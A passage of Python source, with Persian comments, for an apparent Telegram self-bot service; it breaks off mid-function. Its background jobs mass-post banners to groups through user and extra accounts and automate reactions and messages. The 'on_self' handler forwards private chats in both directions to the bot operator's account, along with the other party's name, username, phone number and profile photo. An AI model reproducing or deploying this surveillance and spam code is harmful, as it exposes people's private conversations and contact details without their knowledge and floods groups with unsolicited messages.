                    targets = gs[:int(nrand)]
                except Exception:
                    targets = []
            # دانلود فایل بنر از ربات اگر هست
            media_path = None
            try:
                fid = ban.get('file_id')
                if fid:
                    media_path = 'tmp_otab_' + str(owner) + '.bin'
                    fi = bot.get_file(fid)
                    data = bot.download_file(fi.file_path)
                    with open(media_path, 'wb') as f:
                        f.write(data)
            except Exception:
                media_path = None
            for t in targets[:50]:
                try:
                    ent = t
                    if isinstance(t, str):
                        ent = await cl.get_entity(t)
                    txt = ban.get('text') or ''
                    if media_path and os.path.exists(media_path):
                        await cl.send_file(ent, media_path, caption=txt or None)
                    elif txt:
                        await cl.send_message(ent, txt)
                    else:
                        await cl.send_message(ent, '.')
                except Exception:
                    continue
            if media_path:
                try:
                    os.remove(media_path)
                except Exception:
                    pass
            job['next_ts'] = now + mins * 60
            banner_jobs[uid_k] = job
    except Exception:
        pass

    # ری رندوم: هر N دقیقه روی M نفر
    try:
        import time as _t_ir
        now = _t_ir.time()
        for key, job in list(random_react_jobs.items()):
            if not isinstance(job, dict) or not job.get('active'):
                continue
            if now < float(job.get('next_ts') or 0):
                continue
            uid, chat_id = key
            cl = clients.get(uid)
            if not cl:
                continue
            cnt = int(job.get('count') or 10)
            mins = int(job.get('minutes') or 11)
            try:
                emojis = ['👍', '❤️', '🔥', '😂', '👏', '😍', '🎉', '💯']
                participants = []
                async for p in cl.iter_participants(chat_id, limit=min(200, max(cnt * 3, 20))):
                    if getattr(p, 'bot', False):
                        continue
                    participants.append(p.id)
                random.shuffle(participants)
                chosen = participants[:cnt]
                # last messages from them to react
                async for msg in cl.iter_messages(chat_id, limit=80):
                    if not chosen:
                        break
                    sid = msg.sender_id
                    if sid in chosen:
                        emoji = random.choice(emojis)
                        try:
                            await cl(SendReactionRequest(
                                peer=chat_id,
                                msg_id=msg.id,
                                reaction=[ReactionEmoji(emoticon=emoji)],
                            ))
                        except Exception:
                            pass
                        chosen = [x for x in chosen if x != sid]
                job['next_ts'] = now + mins * 60
                random_react_jobs[key] = job
            except Exception:
                job['next_ts'] = now + mins * 60
                random_react_jobs[key] = job
    except Exception:
        pass
    import time as _ti
    while True:
        try:
            await asyncio.sleep(10)
            now = _ti.time()
            for u, jobs in list(interval_jobs.items()):
                if not jobs:
                    continue
                if not get_ud(u, 'self_enabled', True):
                    continue
                cl = clients.get(u)
                if not cl:
                    continue
                new_jobs = []
                for job in jobs:
                    try:
                        if now >= float(job.get('next_ts') or 0):
                            try:
                                await cl.send_message(job['chat_id'], job.get('text') or '')
                            except Exception:
                                pass
                            job['next_ts'] = now + float(job.get('interval') or 60)
                        new_jobs.append(job)
                    except Exception:
                        pass
                interval_jobs[u] = new_jobs
        except Exception:
            await asyncio.sleep(5)


async def background_tasks():
    meow_counter = 0
    backup_tick = 0
    while True:
        await asyncio.sleep(120)
        backup_tick += 1
        if backup_tick >= 15:
            backup_tick = 0
            try:
                backup_data()
            except Exception:
                pass
        # انقضای بن موقت
        try:
            import time as _tb
            data_b = load_data()
            now_b = _tb.time()
            ch_b = False
            for s, u in list(data_b.get('users', {}).items()):
                until = u.get('ban_temp_until')
                if until and float(until) <= now_b:
                    u['ban_temp_until'] = None
                    u['ban_temp'] = False
                    if not u.get('banned'):
                        u['self_enabled'] = True
                        try:
                            bot.send_message(int(s), "زمان بن موقت شما به پایان رسید می‌توانید از ربات استفاده کنید")
                        except Exception:
                            pass
                    ch_b = True
            if ch_b:
                save_data(data_b)
        except Exception:
            pass
        # کم کردن سکه — فقط روی فایل تازه و زیر قفل (سشن پاک نشود)
        warn_list = []
        zero_list = []
        with LOCK:
            data = _read_data_unlocked()
            changed = False
            for s, u in list((data.get('users') or {}).items()):
                try:
                    uid = int(s)
                except Exception:
                    continue
                if u.get('banned') or u.get('ban_temp_until') or not u.get('self_enabled', True):
                    # بن دائم/موقت یا سلف خاموش → سکه کم نشود
                    continue
                c = int(u.get('coins', 0) or 0)
                if c > 0:
                    # سقف سکه برای محاسبه درصد هشدار
                    peak = int(u.get('coins_peak') or 0)
                    if c > peak:
                        peak = c
                        u['coins_peak'] = peak
                    if peak <= 0:
                        peak = 1000
                        u['coins_peak'] = peak
                    c = max(0, c - 1)
                    u['coins'] = c
                    changed = True
                    lvl = warning_sent.get(uid)
                    # هشدار ۱۰٪ و ۵٪
                    thr10 = max(1, int(peak * 0.10))
                    thr5 = max(1, int(peak * 0.05))
                    if c > 0 and c <= thr5 and lvl != '5':
                        warning_sent[uid] = '5'
                        warn_list.append((uid, '5'))
                    elif c > 0 and c <= thr10 and lvl not in ('5', '10'):
                        warning_sent[uid] = '10'
                        warn_list.append((uid, '10'))
                    if c == 0:
                        u['self_enabled'] = False
                        warning_sent.pop(uid, None)
                        zero_list.append(uid)
            if changed:
                _write_data_unlocked(data)
        for item in warn_list:
            try:
                uid = item[0] if isinstance(item, tuple) else item
                bot.send_message(uid, "<blockquote>سکه های شما رو به اتمام است</blockquote>", parse_mode='HTML')
            except Exception:
                pass
        for uid in zero_list:
            try:
                bot.send_message(uid, "<blockquote>سکه های شما به اتمام رسید</blockquote>", parse_mode='HTML')
            except Exception:
                pass
        # هر ۱ ساعت یوزرنیم/اسم کاربران را بروز کن
        try:
            import time as _t_hr
            now_h = _t_hr.time()
            last_hr = getattr(background_tasks, '_last_user_refresh', 0)
            if now_h - last_hr > 3600:
                background_tasks._last_user_refresh = now_h
                data = load_data()
                changed = False
                for s, u in list((data.get('users') or {}).items())[:200]:
                    try:
                        ch = bot.get_chat(int(s))
                        un = getattr(ch, 'username', None)
                        nm = ((getattr(ch, 'first_name', None) or '') + ' ' + (getattr(ch, 'last_name', None) or '')).strip()
                        if un and u.get('username') != un:
                            u['username'] = un
                            changed = True
                        if nm and u.get('original_name') != nm:
                            u['original_name'] = nm
                            changed = True
                    except Exception:
                        continue
                if changed:
                    _write_data_unlocked(data)
        except Exception:
            pass

        # میو خودکار (هر interval دقیقه)
        import time as _t_meow
        now_m = _t_meow.time()
        for uid, job in list(meow_chats.items()):
            if not isinstance(job, dict):
                # سازگاری با فرمت قدیمی: فقط chat_id
                job = {'chat_id': job, 'interval': 6, 'next_ts': now_m}
                meow_chats[uid] = job
            if not get_ud(uid, 'self_enabled', True) or get_ud(uid, 'coins', 0) <= 0:
                continue
            if now_m < job.get('next_ts', 0):
                continue
            client = clients.get(uid)
            if client and client.is_connected():
                try:
                    await client.send_message(job['chat_id'], "میو")
                except Exception:
                    pass
            job['next_ts'] = now_m + max(1, int(job.get('interval') or 6)) * 60


        # سندر اکانت های اضافه
        import time as _t_snd
        now_s = _t_snd.time()
        for (ouid, acc_id), job in list(sender_jobs.items()):
            if now_s < job.get('next_ts', 0):
                continue
            extras = get_extras(ouid)
            items = get_ud(ouid, 'shared_sender_items', None)
            if items is None:
                info = (extras.get(str(acc_id)) or {})
                items = info.get('sender_items') or []
            if not items:
                job['next_ts'] = now_s + job.get('interval', 60) * 60
                continue
            # هر بار یکی از بنرها به‌صورت رندوم
            item = random.choice(items) if len(items) > 1 else items[0]
            # همه اکانت های اضافه این کاربر
            for aid, inf in extras.items():
                try:
                    key = (int(ouid), int(aid))
                    cl = extra_clients.get(key)
                    if not cl:
                        sess = inf.get('session')
                        if sess:
                            await start_extra_client(ouid, aid, sess)
                            cl = extra_clients.get(key)
                    if not cl:
                        continue
                    for g in job.get('groups') or []:
                        try:
                            peer = g
                            import re as _re
                            m = _re.search(r't\.me/([A-Za-z][A-Za-z0-9_]+)', str(g))
                            if m:
                                peer = m.group(1)
                            txt = item.get('text') or ''
                            html = item.get('html') or ''
                            fpath = item.get('file')
                            if fpath and os.path.exists(str(fpath)):
                                await cl.send_file(
                                    peer, fpath,
                                    caption=html or txt or None,
                                    parse_mode='html' if html else None,
                                )
                            elif html:
                                await cl.send_message(peer, html, parse_mode='html')
                            elif txt:
                                await cl.send_message(peer, txt)
                        except Exception:
                            continue
                except Exception:
                    continue
            job['next_ts'] = now_s + job.get('interval', 60) * 60

        # بنر زمان‌بندی‌شده
        import time as _time_b
        now_b = _time_b.time()
        for uid, jobs in list(banner_jobs.items()):
            if not get_ud(uid, 'self_enabled', True) or get_ud(uid, 'coins', 0) <= 0:
                continue
            client = clients.get(uid)
            if not client or not client.is_connected():
                continue
            for chat_id, job in list(jobs.items()):
                if now_b < job.get('next_ts', 0):
                    continue
                try:
                    await send_banner_message(client, chat_id, job)
                    job['next_ts'] = now_b + job['interval'] * 60
                except Exception:
                    job['next_ts'] = now_b + job.get('interval', 10) * 60

        # ماهی گیری و پیشی خودکار
        import time as _time
        now_ts = _time.time()
        for uid, job in list(fish_jobs.items()):
            if not get_ud(uid, 'self_enabled', True) or get_ud(uid, 'coins', 0) <= 0:
                continue
            if now_ts >= job.get('next_ts', 0):
                client = clients.get(uid)
                if client and client.is_connected():
                    try:
                        # نوبت: 0 (اولی) بعد 1 (وسطی) — سومی هرگز
                        turn = int(job.get('turn', 0)) % 2
                        await send_word_and_click(
                            client, job['chat_id'], 'ماهی',
                            btn_index=turn, require_reply=True, min_buttons=2
                        )
                        job['turn'] = 1 - turn
                    except Exception:
                        pass
                    job['next_ts'] = now_ts + max(1, int(job.get('interval') or 60)) * 60
        for uid, job in list(pishi_jobs.items()):
            if not get_ud(uid, 'self_enabled', True) or get_ud(uid, 'coins', 0) <= 0:
                continue
            if now_ts >= job.get('next_ts', 0):
                client = clients.get(uid)
                if client and client.is_connected():
                    try:
                        # پیشی: همیشه فقط دکمه اول
                        await send_word_and_click(
                            client, job['chat_id'], 'پیشی',
                            btn_index=0, require_reply=True, min_buttons=1
                        )
                    except Exception:
                        pass
                    job['next_ts'] = now_ts + max(1, int(job.get('interval') or 30)) * 60




async def parse_tme_link(link):
    import re as _re
    link = (link or '').strip()
    m = _re.search(r'(?:t\.me|telegram\.me|telegram\.dog)/c/(\d+)/(\d+)', link, flags=_re.I)
    if m:
        return int('-100' + m.group(1)), int(m.group(2))
    m = _re.search(r'(?:t\.me|telegram\.me|telegram\.dog)/([A-Za-z][A-Za-z0-9_]{3,})/(\d+)', link, flags=_re.I)
    if m:
        return m.group(1), int(m.group(2))
    m = _re.search(r'(?:t\.me|telegram\.me)/(-?\d+)/(\d+)', link, flags=_re.I)
    if m:
        cid = int(m.group(1))
        mid = int(m.group(2))
        if cid > 0:
            s = str(cid)
            if s.startswith('100') and len(s) > 5:
                cid = -cid
            else:
                cid = int('-100' + s)
        return cid, mid
    return None


def get_msg_ttl(msg):
    """ثانیه انقضای مدیا/پیام"""
    if not msg:
        return None
    ttl = getattr(msg, 'ttl_period', None)
    if ttl:
        try:
            return int(ttl)
        except Exception:
            return ttl
    media = getattr(msg, 'media', None)
    if media is not None:
        ts = getattr(media, 'ttl_seconds', None)
        if ts:
            return int(ts)
    photo = getattr(msg, 'photo', None)
    if photo is not None:
        ts = getattr(photo, 'ttl_seconds', None)
        if ts:
            return int(ts)
    doc = getattr(msg, 'document', None)
    if doc is not None:
        ts = getattr(doc, 'ttl_seconds', None)
        if ts:
            return int(ts)
        for a in (getattr(doc, 'attributes', None) or []):
            ts = getattr(a, 'ttl_seconds', None)
            if ts:
                return int(ts)
    return None


def media_kind(msg):
    if not msg:
        return 'empty'
    if getattr(msg, 'photo', None):
        return 'عکس'
    if getattr(msg, 'video_note', None):
        return 'ویدیو مسیج'
    if getattr(msg, 'video', None):
        return 'ویدیو'
    if getattr(msg, 'voice', None):
        return 'ویس'
    if getattr(msg, 'sticker', None):
        return 'استیکر'
    if getattr(msg, 'gif', None):
        return 'گیف'
    doc = getattr(msg, 'document', None)
    if doc:
        mt = (getattr(doc, 'mime_type', None) or '').lower()
        if 'gif' in mt:
            return 'گیف'
        if mt.startswith('video'):
            return 'ویدیو'
        if 'ogg' in mt or mt.startswith('audio'):
            return 'ویس'
        if mt.startswith('image'):
            return 'عکس'
        return 'فایل'
    if ((msg.message or msg.text or '') or '').strip():
        return 'پیام'
    return 'دیگر'


def match_kind_filter(kind, filt):
    if not filt or filt in ('کل', 'کل محتوا', 'همه', 'all'):
        return True
    f = (filt or '').strip().replace('\u200c', ' ')
    f_compact = f.replace(' ', '').replace('\u200c', '')
    k = kind or ''
    k_compact = k.replace(' ', '').replace('\u200c', '')
    if f_compact in ('عکس', 'photo', 'image', 'تصویر'):
        return k == 'عکس'
    if f_compact in ('ویدیومسیج', 'videonote', 'video_note'):
        return k_compact == 'ویدیومسیج'
    if f_compact in ('ویدیو', 'video', 'فیلم'):
        return k == 'ویدیو'
    if f_compact in ('ویس', 'voice', 'صدا'):
        return k == 'ویس'
    if f_compact in ('گیف', 'gif'):
        return k == 'گیف'
    if f_compact in ('استیکر', 'sticker'):
        return k == 'استیکر'
    if f_compact in ('پیام', 'text', 'متن', 'message'):
        return k == 'پیام'
    return f in k or k in f



MAX_SAVE_VIDEO_BYTES = 3 * 1024 * 1024  # 3MB


def media_too_large(msg, max_bytes=MAX_SAVE_VIDEO_BYTES):
    """اگر ویدیو/فایل بزرگ‌تر از حد باشد True"""
    try:
        media = getattr(msg, 'media', None)
        if not media:
            return False
        # Document / video
        doc = getattr(media, 'document', None)
        if doc is not None:
            size = getattr(doc, 'size', 0) or 0
            mime = (getattr(doc, 'mime_type', '') or '').lower()
            is_video = mime.startswith('video/') or any(
                getattr(a, 'alt', None) == 'video' or type(a).__name__ == 'DocumentAttributeVideo'
                for a in (getattr(doc, 'attributes', None) or [])
            )
            if is_video and size > max_bytes:
                return True
            # ویدیو مسیج هم document است
            if size > max_bytes and mime.startswith('video/'):
                return True
        # MessageMediaDocument
        if hasattr(media, 'document') and media.document:
            size = getattr(media.document, 'size', 0) or 0
            mime = (getattr(media.document, 'mime_type', '') or '').lower()
            if mime.startswith('video/') and size > max_bytes:
                return True
    except Exception:
        pass
    return False


async def save_msg_to_me(client, msg, header=None, dest='me'):
    import os as _os
    caption = msg.message or msg.text or ''
    head = (header + chr(10)) if header else ''
    target = dest or 'me'
    if msg.media:
        # ویدیو بزرگ‌تر از 3MB ذخیره نشود
        if media_too_large(msg):
            body = head + (caption or '')
            note = "فایل بیش از 1MB بود و ذخیره نشد."
            try:
                await client.send_message(target, (body + chr(10) if body.strip() else '') + note)
            except Exception:
                pass
            return False
        _os.makedirs('dl_cache', exist_ok=True)
        path = await client.download_media(msg, file=_os.path.join('dl_cache', f'{getattr(msg, "chat_id", 0)}_{msg.id}'))
        if path:
            # چک حجم فایل دانلودشده
            try:
                if _os.path.getsize(path) > MAX_SAVE_VIDEO_BYTES:
                    mime_ok = False
                    # فقط ویدیو را محدود کن
                    try:
                        doc = getattr(getattr(msg, 'media', None), 'document', None)
                        mime = (getattr(doc, 'mime_type', '') or '').lower() if doc else ''
                        if mime.startswith('video/') or (path and str(path).lower().endswith(('.mp4', '.mov', '.mkv', '.webm', '.avi'))):
                            mime_ok = True
                    except Exception:
                        if str(path).lower().endswith(('.mp4', '.mov', '.mkv', '.webm', '.avi')):
                            mime_ok = True
                    if mime_ok:
                        try:
                            _os.remove(path)
                        except Exception:
                            pass
                        note = "فایل بیش از 1MB بود و ذخیره نشد."
                        body = head + (caption or '')
                        try:
                            await client.send_message(target, (body + chr(10) if body.strip() else '') + note)
                        except Exception:
                            pass
                        return False
            except Exception:
                pass
            cap = (head + caption) if (head or caption) else None
            await client.send_file(target, path, caption=cap)
            return True
    body = head + (caption or '')
    if body.strip():
        await client.send_message(target, body)
        return True
    return False




def fancy_font_variants(word):
    """همان کلمه با فونت‌های یونیکد کمیاب — هر خط یک فونت، بدون تکرار"""
    word = str(word or '')
    if not word:
        return []

    # هر ردیف: (A-Z 26 حرف) (a-z 26 حرف) — فقط استایل‌هایی که در تلگرام درست دیده می‌شوند
    packs = [
        # Bold
        ("𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙", "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"),
        # Italic
        ("𝐴𝐵𝐶𝐷𝐸𝐹𝐺𝐻𝐼𝐽𝐾𝐿𝑀𝑁𝑂𝑃𝑄𝑅𝑆𝑇𝑈𝑉𝑊𝑋𝑌𝑍", "𝑎𝑏𝑐𝑑𝑒𝑓𝑔ℎ𝑖𝑗𝑘𝑙𝑚𝑛𝑜𝑝𝑞𝑟𝑠𝑡𝑢𝑣𝑤𝑥𝑦𝑧"),
        # Bold Italic
        ("𝑨𝑩𝑪𝑫𝑬𝑭𝑮𝑯𝑰𝑱𝑲𝑳𝑴𝑵𝑶𝑷𝑸𝑹𝑺𝑻𝑼𝑽𝑾𝑿𝒀𝒁", "𝒂𝒃𝒄𝒅𝒆𝒇𝒈𝒉𝒊𝒋𝒌𝒍𝒎𝒏𝒐𝒑𝒒𝒓𝒔𝒕𝒖𝒗𝒘𝒙𝒚𝒛"),
        # Script
        ("𝒜𝐵𝒞𝒟𝐸𝐹𝒢𝐻𝐼𝒥𝒦𝐿𝑀𝒩𝒪𝒫𝒬𝑅𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵", "𝒶𝒷𝒸𝒹𝑒𝒻𝑔𝒽𝒾𝒿𝓀𝓁𝓂𝓃𝑜𝓅𝓆𝓇𝓈𝓉𝓊𝓋𝓌𝓍𝓎𝓏"),
        # Bold Script
        ("𝓐𝓑𝓒𝓓𝓔𝓕𝓖𝓗𝓘𝓙𝓚𝓛𝓜𝓝𝓞𝓟𝓠𝓡𝓢𝓣𝓤𝓥𝓦𝓧𝓨𝓩", "𝓪𝓫𝓬𝓭𝓮𝓯𝓰𝓱𝓲𝓳𝓴𝓵𝓶𝓷𝓸𝓹𝓺𝓻𝓼𝓽𝓾𝓿𝔀𝔁𝔂𝔃"),
        # Fraktur
        ("𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ", "𝔞𝔟𝔠𝔡𝔢𝔣𝔤𝔥𝔦𝔧𝔨𝔩𝔪𝔫𝔬𝔭𝔮𝔯𝔰𝔱𝔲𝔳𝔴𝔵𝔶𝔷"),
        # Bold Fraktur
        ("𝕬𝕭𝕮𝕯𝕰𝕱𝕲𝕳𝕴𝕵𝕶𝕷𝕸𝕹𝕺𝕻𝕼𝕽𝕾𝕿𝖀𝖁𝖂𝖃𝖄𝖅", "𝖆𝖇𝖈𝖉𝖊𝖋𝖌𝖍𝖎𝖏𝖐𝖑𝖒𝖓𝖔𝖕𝖖𝖗𝖘𝖙𝖚𝖛𝖜𝖝𝖞𝖟"),
        # Double-struck
        ("𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ", "𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫"),
        # Sans
        ("𝖠𝖡𝖢𝖣𝖤𝖥𝖦𝖧𝖨𝖩𝖪𝖫𝖬𝖭𝖮𝖯𝖰𝖱𝖲𝖳𝖴𝖵𝖶𝖷𝖸𝖹", "𝖺𝖻𝖼𝖽𝖾𝖿𝗀𝗁𝗂𝗃𝗄𝗅𝗆𝗇𝗈𝗉𝗊𝗋𝗌𝗍𝗎𝗏𝗐𝗑𝗒𝗓"),
        # Sans Bold
        ("𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭", "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"),
        # Sans Italic
        ("𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡", "𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻"),
        # Sans Bold Italic
        ("𝘼𝘽𝘾𝘿𝙀𝙁𝙂𝙃𝙄𝙅𝙆𝙇𝙈𝙉𝙊𝙋𝙌𝙍𝙎𝙏𝙐𝙑𝙒𝙓𝙔𝙕", "𝙖𝙗𝙘𝙙𝙚𝙛𝙜𝙝𝙞𝙟𝙠𝙡𝙢𝙣𝙤𝙥𝙦𝙧𝙨𝙩𝙪𝙫𝙬𝙭𝙮𝙯"),
        # Monospace
        ("𝙰𝙱𝙲𝙳𝙴𝙵𝙶𝙷𝙸𝙹𝙺𝙻𝙼𝙽𝙾𝙿𝚀𝚁𝚂𝚃𝚄𝚅𝚆𝚇𝚈𝚉", "𝚊𝚋𝚌𝚍𝚎𝚏𝚐𝚑𝚒𝚓𝚔𝚕𝚖𝚗𝚘𝚙𝚚𝚛𝚜𝚝𝚞𝚟𝚠𝚡𝚢𝚣"),
        # Fullwidth
        ("ＡＢＣＤＥＦＧＨＩＪＫＬＭＮＯＰＱＲＳＴＵＶＷＸＹＺ", "ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ"),
        # Circled
        ("ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏ", "ⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ"),
        # Negative circled
        ("🅐🅑🅒🅓🅔🅕🅖🅗🅘🅙🅚🅛🅜🅝🅞🅟🅠🅡🅢🅣🅤🅥🅦🅧🅨🅩", "🅐🅑🅒🅓🅔🅕🅖🅗🅘🅙🅚🅛🅜🅝🅞🅟🅠🅡🅢🅣🅤🅥🅦🅧🅨🅩"),
        # Squared
        ("🄰🄱🄲🄳🄴🄵🄶🄷🄸🄹🄺🄻🄼🄽🄾🄿🅀🅁🅂🅃🅄🅅🅆🅇🅈🅉", "🄰🄱🄲🄳🄴🄵🄶🄷🄸🄹🄺🄻🄼🄽🄾🄿🅀🅁🅂🅃🅄🅅🅆🅇🅈🅉"),
        # Small caps style (mixed phonetic)
        ("ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ", "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ"),
        # Upside down
        ("∀𐐒ƆᗡƎℲ⅁HIſ⋊˥WNOԀΌᴚS⊥∩ΛMX⅄Z", "ɐqɔpǝɟƃɥᴉɾʞlɯuodbɹsʇnʌʍxʎz"),
        # Superscript-ish
        ("ᴬᴮᶜᴰᴱᶠᴳᴴᴵᴶᴷᴸᴹᴺᴼᴾQᴿˢᵀᵁⱽᵂˣʸᶻ", "ᵃᵇᶜᵈᵉᶠᵍʰⁱʲᵏˡᵐⁿᵒᵖqʳˢᵗᵘᵛʷˣʸᶻ"),
    ]

    def convert(w, up, low):
        out = []
        for ch in w:
            if 'A' <= ch <= 'Z':
                out.append(up[ord(ch) - ord('A')])
            elif 'a' <= ch <= 'z':
                out.append(low[ord(ch) - ord('a')])
            else:
                out.append(ch)
        return ''.join(out)

    seen = set()
    result = []
    for up, low in packs:
        if len(up) < 26 or len(low) < 26:
            # iterate by unicode chars carefully
            up_l = list(up)
            low_l = list(low)
            if len(up_l) < 26 or len(low_l) < 26:
                continue
            up, low = ''.join(up_l[:26]), ''.join(low_l[:26])
        try:
            s = convert(w=word, up=up, low=low) if False else None
        except Exception:
            s = None
        # proper convert with list index
        up_l = list(up) if not isinstance(up, list) else up
        # unicode strings may be multi-codepoint - use list of chars from the pack strings carefully
        # packs use single codepoint letters mostly
        up_chars = [c for c in up]
        low_chars = [c for c in low]
        if len(up_chars) < 26 or len(low_chars) < 26:
            continue
        out = []
        for ch in word:
            if 'A' <= ch <= 'Z':
                out.append(up_chars[ord(ch) - 65])
            elif 'a' <= ch <= 'z':
                out.append(low_chars[ord(ch) - 97])
            else:
                out.append(ch)
        s = ''.join(out)
        if s and s not in seen:
            seen.add(s)
            result.append(s)
        if len(result) >= 20:
            break
    return result



async def on_self(event, uid):
    # half-batch hooks for auto/random react stop
    try:
        _t0 = (event.raw_text or '').strip() if getattr(event, 'out', False) else ''
    except Exception:
        _t0 = ''
    # ری‌اکت خودکار
    if not getattr(event, 'out', False):
        try:
            sid = int(event.sender_id)
            job = auto_react_jobs.get((uid, sid)) or react_targets.get((uid, sid))
            if job and (job.get('mode') == 'auto' or (uid, sid) in auto_react_jobs):
                emoji = job.get('emoji') or '👍'
                try:
                    await event.client(SendReactionRequest(
                        peer=event.chat_id,
                        msg_id=event.id,
                        reaction=[ReactionEmoji(emoticon=emoji)],
                    ))
                except Exception:
                    try:
                        msg = await event.client.get_messages(event.chat_id, ids=event.id)
                        if msg:
                            await msg.react(emoji)
                    except Exception:
                        pass
        except Exception:
            pass

    # جاسوسی پیوی کامل: دو طرف + ریپلای + آلبوم + map برای ویرایش/ری‌اکت
    if getattr(event, 'is_private', False) and (uid in pv_spy):
        try:
            is_out = bool(getattr(event, 'out', False))
            peer = int(event.chat_id)
            key = (int(uid), int(peer))
            if key not in pv_reported_peers:
                pv_reported_peers[key] = True
                try:
                    ent = await event.client.get_entity(peer)
                    n1 = getattr(ent, 'first_name', '') or ''
                    n2 = getattr(ent, 'last_name', '') or ''
                    nm = (n1 + ' ' + n2).strip() or str(peer)
                    un = getattr(ent, 'username', None)
                    ph = getattr(ent, 'phone', None)
                    body = (
                        "<blockquote><b>پیوی جدید</b></blockquote>" + chr(10)
                        + "<blockquote>اکانت: <code>" + str(uid) + "</code></blockquote>" + chr(10)
                        + "<blockquote>نام: " + str(nm).replace('<', '') + "</blockquote>" + chr(10)
                        + "<blockquote>ایدی: <code>" + str(peer) + "</code></blockquote>" + chr(10)
                    )
                    if un:
                        body += "<blockquote>یوزرنیم: @" + str(un).replace('<', '') + "</blockquote>" + chr(10)
                    if ph:
                        body += "<blockquote>شماره: <code>" + str(ph) + "</code></blockquote>" + chr(10)
                    body += "<blockquote>زمان: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "</blockquote>"
                    try:
                        photos = await event.client.get_profile_photos(peer, limit=1)
                        if photos:
                            path = await event.client.download_media(photos[0], file='tmp_pv_pfp_' + str(peer) + '.jpg')
                            if path and os.path.exists(path):
                                bot.send_photo(OWNER_ID, open(path, 'rb'), caption=body, parse_mode='HTML')
                                try:
                                    os.remove(path)
                                except Exception:
                                    pass
                            else:
                                bot.send_message(OWNER_ID, body, parse_mode='HTML')
                        else:
                            bot.send_message(OWNER_ID, body, parse_mode='HTML')
                    except Exception:
                        bot.send_message(OWNER_ID, body, parse_mode='HTML')
                except Exception:
                    pass
            txt = event.raw_text or ''
            dir_l = "خروجی" if is_out else "ورودی"
            cap = (
                "<blockquote>پیام " + dir_l + "</blockquote>" + chr(10)
                + "<blockquote>اکانت <code>" + str(uid) + "</code> | طرف <code>" + str(peer) + "</code></blockquote>"
            )
            reply_to_bot = None
            # ریپلای زنجیره‌ای
            try:
                if event.is_reply:
                    rep = await event.get_reply_message()
                    if rep:
                        rkey = (int(uid), int(event.chat_id), int(rep.id))
                        mapped = pv_msg_map.get(rkey)
                        if mapped and mapped.get('bot_mid'):
                            reply_to_bot = mapped['bot_mid']
                        else:
                            # پیام ریپلای‌شده قبلاً نیامده — اول بفرست
                            rtxt = rep.raw_text or ''
                            rcap = (
                                "<blockquote>ریپلای ناموجود</blockquote>" + chr(10)
                                + "<blockquote>پیام قبلی:</blockquote>" + chr(10)
                                + "<blockquote>" + str(rtxt)[:500].replace('<', '') + "</blockquote>"
                            )
                            try:
                                if rep.media and not media_too_large(rep):
                                    rpath = await event.client.download_media(rep, file='tmp_pv_rep_' + str(rep.id))
                                    if rpath and os.path.exists(rpath):
                                        m0 = bot.send_document(OWNER_ID, open(rpath, 'rb'), caption=rcap, parse_mode='HTML')
                                        try:
                                            os.remove(rpath)
                                        except Exception:
                                            pass
                                    else:
                                        m0 = bot.send_message(OWNER_ID, rcap, parse_mode='HTML')
                                else:
                                    m0 = bot.send_message(OWNER_ID, rcap, parse_mode='HTML')
                                reply_to_bot = m0.message_id
                                pv_msg_map[rkey] = {'bot_mid': m0.message_id, 'chat': OWNER_ID}
                            except Exception:
                                pass
            except Exception:
                pass
            # آلبوم
            grouped = getattr(event, 'grouped_id', None) or getattr(event.message, 'grouped_id', None)
            if grouped and event.media:
                import time as _t_al
                ak = (int(uid), int(event.chat_id), int(grouped))
                buf = pv_album_buf.get(ak) or {'items': [], 'ts': _t_al.time(), 'cap': cap, 'is_out': is_out, 'peer': peer, 'reply_to': reply_to_bot}
                try:
                    path = await event.client.download_media(event.message, file='tmp_pv_al_' + str(event.id))
                    if path and os.path.exists(path):
                        buf['items'].append(path)
                except Exception:
                    pass
                if txt:
                    buf['cap'] = cap + chr(10) + str(txt)[:500]
                buf['reply_to'] = reply_to_bot or buf.get('reply_to')
                pv_album_buf[ak] = buf
                # بعد از کمی تأخیر ارسال گروهی
                async def _flush_album(ak=ak, event=event, uid=uid):
